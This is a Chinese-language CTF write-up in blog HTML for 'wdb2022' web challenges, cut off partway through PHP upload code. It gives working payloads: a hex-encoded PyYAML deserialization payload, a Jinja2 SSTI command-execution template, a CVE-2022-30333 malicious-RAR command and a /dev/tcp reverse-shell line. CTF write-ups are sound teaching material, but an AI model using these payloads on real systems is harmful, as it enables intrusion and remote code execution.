@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="aesm1p">
+
+
+
+    <meta name="description" content="相逢意气为君饮">
+
+
+
+<title>wdb2022 | aesm1p&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/a.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">wdb2022</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 5, 2022&nbsp;&nbsp;20:08:38</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/writeup/">writeup</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easyrar"><a href="#easyrar" class="headerlink" title="easyrar"></a>easyrar</h2><p>查看代码可知在upload路由处需要用户名为Administrator才能登录，可是默认是guest用户，所以需要伪造session，在代码中还存在一处目录穿越文件读取漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:file&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;updir&#x27;</span>):</span><br><span class="line">        basedir = session.get(<span class="string">&#x27;updir&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = os.path.join(basedir, file).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                <span class="keyword">return</span> send_file(path)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> response(<span class="string">&quot;Not Found.&quot;</span>, <span class="number">404</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> response(<span class="string">&quot;Failed.&quot;</span>, <span class="number">500</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里只过滤了<code>../</code>可以用<code>....//</code>绕过，secret_key的赋值语句如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = socket.gethostname()</span><br></pre></td></tr></table></figure>
+
+<p>hostname可以通过文件读取漏洞来获得。</p>
+<img src="/2022/09/05/wdb2022/1.png" class="">
+
+<p>接着按照hostname构造session即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python flask_session_cookie_manager3.py encode -s &#x27;aesm1p-VirtualBox&#x27; -t &quot;&#123;&#x27;updir&#x27;: &#x27;static/uploads/9b8537fe733ec35cb92a2baa09fe30b1&#x27;, &#x27;user&#x27;: &#x27;Administrator&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1cGRpciI6InN0YXRpYy91cGxvYWRzLzliODUzN2ZlNzMzZWMzNWNiOTJhMmJhYTA5ZmUzMGIxIiwidXNlciI6IkFkbWluaXN0cmF0b3IifQ.YxbD5w.3R8FoAXIHEZMOuTOPq8HyxtXGew</span><br></pre></td></tr></table></figure>
+
+<p>接着upload的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">extractdir = <span class="string">f&quot;<span class="subst">&#123;session.get(<span class="string">&#x27;updir&#x27;</span>)&#125;</span>/<span class="subst">&#123;filename.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">    os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line">pStatus = subprocess.Popen([<span class="string">&quot;/usr/bin/unrar&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;-o+&quot;</span>, filepath, extractdir])</span><br><span class="line">t_beginning = time.time()  </span><br><span class="line">seconds_passed = <span class="number">0</span></span><br><span class="line">timeout=<span class="number">60</span></span><br></pre></td></tr></table></figure>
+
+<p>这里unrar存在路径穿越漏洞，可以跨目录写入文件</p>
+<p>接着查看display路由</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">f&#x27;fileinfo/<span class="subst">&#123;md5(filename.encode()).hexdigest()&#125;</span>.yaml&#x27;</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;fileinfo/<span class="subst">&#123;md5(filename.encode()).hexdigest()&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        yamlDatas = f.read()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;apply|process|out|system|exec|tuple|flag|\(|\)|\&#123;|\&#125;&quot;</span>, yamlDatas, re.M|re.I):</span><br><span class="line">            rarDatas = yaml.load(yamlDatas.strip().strip(<span class="string">b&#x27;\x00&#x27;</span>.decode()))</span><br><span class="line">            <span class="keyword">if</span> rarDatas:</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, filename=filename, path=filename.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>], files=rarDatas[<span class="string">&#x27;files&#x27;</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> response(<span class="string">&#x27;Internal Server Error.&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> response(<span class="string">&#x27;Forbidden.&#x27;</span>, <span class="number">403</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> response(<span class="string">&quot;Not Found.&quot;</span>, <span class="number">404</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>可以看到这里存在yaml反序列化，所以可以配合unrar路径穿越漏洞上传恶意rar包触发反序列化。</p>
+<p>首先构造yaml文件，需要绕过过滤规则，过滤规则的编写这里需要对黑名单进行绕过，可以编写如下的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:frozenset</span><br><span class="line">- !!python/object/new:map</span><br><span class="line">  - !!python/name:eval  </span><br><span class="line">  - [&quot;whoami&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>由于存在黑名单过滤，这里可以使用编码来进行绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">s</span>):</span><br><span class="line">    r=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        r += <span class="string">&#x27;\\x&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i)))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls / &gt; /tmp/aesm1p&#x27;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(a(s))</span><br></pre></td></tr></table></figure>
+
+<p>最终payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:frozenset</span><br><span class="line">- !!python/object/new:map</span><br><span class="line">  - !!python/name:eval  </span><br><span class="line">  - [&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x20\x2f\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x68\x7a\x63\x27\x29&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>将该文件构造成恶意unrar文件，查看源码可知这里需要跳四层目录才能跳到fileinfo所在的目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby cve-2022-30333.rb &#x27;../../../../fileinfo/b0ab0254bd58eb87eaee3172ba49fefb.yaml&#x27; poc.txt &gt; poc.rar</span><br></pre></td></tr></table></figure>
+
+<p>然后上传文件</p>
+<img src="/2022/09/05/wdb2022/2.png" class="">
+
+<p>这个时候已经unrar已经触发，然后接下来访问display页面即可触发反序列化</p>
+<img src="/2022/09/05/wdb2022/3.png" class="">
+
+<p>那么通过任意文件读取即可查看命令执行结果</p>
+<img src="/2022/09/05/wdb2022/4.png" class="">
+
+<p>命令执行麻烦的话可以使用反弹shell，payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).call(<span class="string">&quot;echo \&#x27;sh -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1\&#x27; &gt; x &amp;&amp; bash x &amp;&amp; rm -rf x&quot;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>PS：这里还有一种解法是上传一个pickle反序列化文件（这样的二进制文件可以绕过黑名单），然后通过eval函数通过pcikle代码执行命令</p>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>由于unrar的<code>-o+</code>参数可以覆盖文件，那么还可以通过覆盖模板文件result.html来进行ssti注入实现rce。但是这个方法存在缺陷，必须在第一次渲染result.html，因为第一次渲染之后文件就被存储到内存中了，这之后在修改result.html文件就不会起作用。</p>
+<p>我们利用upload功能覆盖一下result.html文件，覆盖的内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.args.input).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby cve-2022-30333.rb &#x27;../../../../fileinfo/b0ab0254bd58eb87eaee3172ba49fefb.yaml&#x27; poc.txt &gt; poc.rar</span><br></pre></td></tr></table></figure>
+
+<p>然后上传文件，访问display页面即可触发（要注意file参数必须为存在的rar文件，否则会触发404，无法执行到模板渲染页面）</p>
+<img src="/2022/09/05/wdb2022/5.png" class="">
+
+<h2 id="eci"><a href="#eci" class="headerlink" title="eci"></a>eci</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>开启apache服务器.htaccess支持</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure>
+
+<p>将AllowOverride修改为All</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory /var/www/&gt;</span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后开启rewrite模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>
+
+<p>运行composer安装网站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer install</span><br></pre></td></tr></table></figure>
+
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>这是一个php魔改的项目，核心功能就一个文件上传功能，能够上传两种类型文件，分别是图片和文本，上传图片功能代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_as_image</span>(<span class="params"><span class="variable">$image_type</span>, <span class="variable">$image_tmp_file</span>, <span class="variable">$upload_base_dir</span>, <span class="variable">$file_ext_black_list</span>, <span class="variable">$image_filename</span>=<span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$image_type</span>, <span class="variable">$file_ext_black_list</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;jpg&#x27;</span>:</span><br><span class="line">            <span class="variable">$image_ext</span> = <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;png&#x27;</span>:</span><br><span class="line">            <span class="variable">$image_ext</span> = <span class="string">&#x27;.png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;gif&#x27;</span>:</span><br><span class="line">            <span class="variable">$image_ext</span> = <span class="string">&#x27;.gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$image_ext</span> = <span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$image_size</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$image_tmp_file</span>);</span><br><span class="line">    <span class="variable">$image_width</span> = <span class="variable">$image_size</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$image_height</span> = <span class="variable">$image_size</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$image_width</span> &gt; <span class="number">200</span> || <span class="variable">$image_height</span> &gt; <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$image_filename</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="variable">$image_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="variable">$image_ext</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$image_filename</span> = <span class="variable">$image_filename</span> . <span class="variable">$image_ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_base_dir</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_base_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$image_file_path</span> = <span class="variable">$upload_base_dir</span> . <span class="variable">$image_filename</span>;</span><br><span class="line">    <span class="title function_ invoke__">rename</span>(<span class="variable">$image_tmp_file</span>, <span class="variable">$image_file_path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_as_text</span>(<span class="params"><span class="variable">$text_type</span>, <span class="variable">$text_tmp_file</span>, <span class="variable">$upload_base_dir</span>, <span class="variable">$text_filename</span>=<span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$text_type</span>, <span class="string">&quot;ph&quot;</span>)  || <span class="title function_ invoke__">in_array</span>(<span class="variable">$text_type</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;shtml&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;php7&#x27;</span>, <span class="string">&#x27;phtm&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>, <span class="string">&#x27;php8&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;tpl&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;.&quot;</span>) || <span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">strlen</span>(<span class="variable">$text_type</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$text_ext</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$text_type</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$text_ext</span> = <span class="string">&quot;.&quot;</span> . <span class="variable">$text_type</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$text_filename</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="variable">$text_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="variable">$text_ext</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$text_filename</span> = <span class="variable">$text_filename</span> . <span class="variable">$text_ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$text_filename</span>) == <span class="number">0</span> || <span class="title function_ invoke__">strstr</span>(<span class="variable">$text_filename</span>, <span class="string">&quot;/&quot;</span>) ||!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9_]/is&#x27;</span>, <span class="variable">$text_filename</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_base_dir</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_base_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$text_file_path</span> = <span class="variable">$upload_base_dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$text_filename</span>;</span><br><span class="line">    <span class="title function_ invoke__">rename</span>(<span class="variable">$text_tmp_file</span>, <span class="variable">$text_file_path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上传图片代码可以看出，对后缀进行了白名单校验，使用imagesize来校验图片，这个可以绕过，在图片名称处：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$image_filename</span> = <span class="variable">$image_filename</span> . <span class="variable">$image_ext</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里image_filename没有任何校验，所以可以进行目录穿越，总结来说，这个图片上传功能可以向某个目录上传一个恶意的图片马。<br>上传文本文件代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_as_text</span>(<span class="params"><span class="variable">$text_type</span>, <span class="variable">$text_tmp_file</span>, <span class="variable">$upload_base_dir</span>, <span class="variable">$text_filename</span>=<span class="literal">FALSE</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$text_type</span>, <span class="string">&quot;ph&quot;</span>)  || <span class="title function_ invoke__">in_array</span>(<span class="variable">$text_type</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;shtml&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span 